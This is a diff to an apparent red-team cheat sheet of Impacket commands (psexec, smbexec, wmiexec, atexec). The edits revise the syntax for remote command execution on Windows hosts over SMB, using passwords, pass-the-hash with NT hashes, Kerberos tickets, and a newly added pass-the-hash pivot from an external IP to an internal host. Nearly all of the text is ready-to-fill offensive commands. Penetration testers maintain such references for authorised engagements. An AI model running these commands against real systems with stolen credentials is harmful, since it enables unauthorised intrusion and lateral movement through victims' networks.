@@ -7,7 +7,7 @@
 create a new service (using \pipe\svcctl via SMB)
 
 ```
-psexec.py <domain>/<user>:<password>@<ip>
+impacket-psexec <domain>/<user>:<password>@<target_ip>
 ```
 
 ## PSEXEC with pass the Hash (pth)
@@ -15,7 +15,12 @@ psexec.py <domain>/<user>:<password>@<ip>
 create a new service (using \pipe\svcctl via SMB)
 
 ```
-psexec.py -hashes <hash> <user>@<ip>
+impacket-psexec -hashes 00000000000000000000000000000000:<nthash> <user>@<target_ip>
+```
+
+## PSEXEC - PTH to internal via external IP
+```
+impacket-psexec -hashes 00000000000000000000000000000000:<nthash> -port <port|445> -target-ip <external_ip> <user>@<internal_ip>
 ```
 
 ## PSEXEC with kerberos
@@ -23,21 +28,21 @@ psexec.py -hashes <hash> <user>@<ip>
 create a new service (using \pipe\svcctl via SMB)
 
 ```
-export KRB5CCNAME=<ccache_file>; psexec.py -dc-ip <dc_ip> -target-ip <ip>> -no-pass -k <domain>/<user>@<target_name>
+export KRB5CCNAME=<ccache_file>; impacket-psexec -dc-ip <dc_ip> -target-ip <target_ip> -no-pass -k <domain>/<user>@<target_name>
 ```
 
 ## SMBEXEC with username
 #plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT  
 create a new service 'BTOBTO' (using temp bat files via SMB)
 ```
-smbexec.py <domain>/<user>:<password>@<ip>
+smbexec.py <domain>/<user>:<password>@<target_ip>
 ```
 
 ## SMBEXEC with pass the Hash (pth)
 #plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/CONNECT  
 create a new service 'BTOBTO' (using temp bat files via SMB)
 ```
-smbexec.py -hashes <hash> <user>@<ip>
+smbexec.py -hashes <nthash> <user>@<target_ip>
 ```
 
 ## SMBEXEC with kerberos
@@ -61,7 +66,7 @@ wmiexec.py <domain>/<user>:<password>@<ip>
 Execute a command shell without touching the disk or running a new service using DCOM
 
 ```
-wmiexec.py -hashes <hash> <user>@<ip>
+wmiexec.py -hashes <nthash> <user>@<ip>
 ```
 
 ## atexec - execute command view the task scheduler 
@@ -77,5 +82,5 @@ atexec.py <domain>/<user>:<password>@<ip> "command"
 Execute command view the task scheduler (using \pipe\atsvc via SMB)
 
 ```
-atexec.py -hashes <hash> <user>@<ip> "command"
+atexec.py -hashes <nthash> <user>@<ip> "command"
 ```
